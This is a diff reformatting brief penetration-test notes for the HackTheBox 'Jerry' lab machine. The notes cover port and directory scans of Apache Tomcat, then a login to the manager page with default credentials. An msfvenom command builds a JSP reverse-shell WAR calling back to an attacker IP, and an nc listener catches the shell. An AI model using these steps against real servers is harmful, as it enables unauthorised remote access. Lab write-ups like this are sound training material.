@@ -1,27 +1,25 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # Jerry
-# 16/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Windows |
+| Difficulty | Easy |
+
 10.10.10.95
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
 
-----------------------------------------------------
 # gobuster 
-----------------------------------------------------
 http://10.10.10.95:8080/manager
 
 /docs                 (Status: 302) [Size: 0] [--> /docs/]
 /examples             (Status: 302) [Size: 0] [--> /examples/]
 /manager              (Status: 302) [Size: 0] [--> /manager/]
 
-----------------------------------------------------
-# exploitation
-----------------------------------------------------
+## Exploitation
 use admin:admin on port 8080/manger it gave id pass
 user username="tomcat" password="s3cret"
 we can clear our session cookie and re enter it with this creds
@@ -37,5 +35,3 @@ or msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war 
 nc -lvp 1234 and do it manually
 
 we got shell as jerry
-
-
